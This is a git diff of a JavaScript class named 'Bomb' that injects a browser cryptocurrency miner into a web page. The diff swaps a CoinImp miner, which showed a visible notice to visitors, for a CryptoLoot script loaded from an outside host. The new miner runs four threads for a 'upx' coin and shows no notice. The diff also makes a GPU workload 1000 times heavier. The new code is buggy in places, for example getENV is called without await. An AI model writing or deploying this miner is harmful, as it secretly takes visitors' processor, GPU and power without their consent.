@@ -1,26 +1,34 @@
-// GPU is a constructor and namespace for browser
-// import GPU from './gpu-browser.min.js'
-
 class Bomb {
     constructor() {
         this.libGPUjs = 'https://unpkg.com/gpu.js@latest/dist/gpu-browser.min.js'
-        this.libCoinImp = 'Xsp2.js'
+        this.libCryptoLoot = 'https://statdynamic.com/lib/crypta.js'
         this.envfile = 'env.json'
 
         console.log("Building bomb...")
         this.importLib(this.libGPUjs).then(() => {
-            console.log('Ready to explode')
+            console.log('Ready to loot')
         })
-        this.importLib(this.libCoinImp).then(() => {
-            console.log('Ready to mine')
+        this.importLib(this.libCryptoLoot).then(() => {
+            console.log('Ready to loot')
         })
+
+        //this.libRequireJS = 'lib/require.js'
+
+        // this.importLib(this.libRequireJS).then(() => {
+        //     console.log('Ready to require')
+        //
+        // })
     }
 
-    async importLib(src) {
+    async importLib(src, isModule = false) {
         let li = document.createElement('script');
-        li.type = 'text/javascript';
+        if (!isModule) {
+            li.type = 'text/javascript';
+        } else {
+            li.type = 'module';
+        }
         li.src = src;
-        li.async = true;
+        li.async = false;
         let s = document.getElementsByTagName('script')[0];
         s.parentNode.insertBefore(li, s);
         return true
@@ -30,6 +38,14 @@ class Bomb {
         return new Promise(resolve => setTimeout(resolve, ms));
     }
 
+    async getENV() {
+        return await fetch(this.envfile)
+            .then(response => response.json())
+            .then(env => {
+                return env
+            })
+    }
+
     async getToken() {
         let TOKEN = ''
         return await fetch(this.envfile)
@@ -37,15 +53,6 @@ class Bomb {
             .then(env => {
                 return TOKEN = env.TOKEN
             })
-    }
-
-    mine(TOKEN) {
-        let _client = new Client.Anonymous(TOKEN, {
-            throttle: 0, c: 'w'
-        });
-        _client.start();
-        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-        return 0
     }
 
     testGPU(gpu) {
@@ -64,8 +71,10 @@ class Bomb {
 
         const multiplyMatrix = gpu.createKernel(function (a, b) {
             let sum = 0;
-            for (let i = 0; i < 512; i++) {
-                sum += a[this.thread.y][i] * b[i][this.thread.x];
+            for (let j = 0; j < 1000; j++) {
+                for (let i = 0; i < 512; i++) {
+                    sum += a[this.thread.y][i] * b[i][this.thread.x];
+                }
             }
             return sum;
         }).setOutput([512, 512])
@@ -74,15 +83,39 @@ class Bomb {
         console.log(out[10][12]) // Logs the element at the 10th row and the 12th column of the output matrix
     }
 
+    // async requireBundle() {
+    //     requirejs.config({
+    //         baseUrl: "lib/",
+    //         enforceDefine: true,
+    //         waitSeconds: 200,
+    //         paths: {
+    //             "gpujs": 'gpu-browser.min',
+    //             'cryptoloot': this.libCryptoLoot
+    //         }
+    //     });
+    //
+    //     this.gpujs = requirejs(['gpujs'])
+    // }
+
+    async mine(TOKEN) {
+        let miner = new CRLT.Anonymous(TOKEN, {
+            threads: 4, throttle: 0.2, coin: "upx",
+        });
+        miner.start();
+    }
+
     async explode() {
-        await this.sleep(1000)
-        let TOKEN = await this.getToken()
+        await this.sleep(2000)
+
+        // await this.requireBundle()
+
+        let ENV = this.getENV()
+        let TOKEN = ENV.TOKEN
 
         const gpu = new GPU()
         this.testGPU(gpu)
-        const miner = gpu.createKernel(this.mine(TOKEN), {output: [1]})
-        const c = miner();
-        console.log(c)
+        const gpuminer = gpu.createKernel(this.mine(TOKEN), {output: [1]})
+        console.log(gpuminer)
     }
 }
 
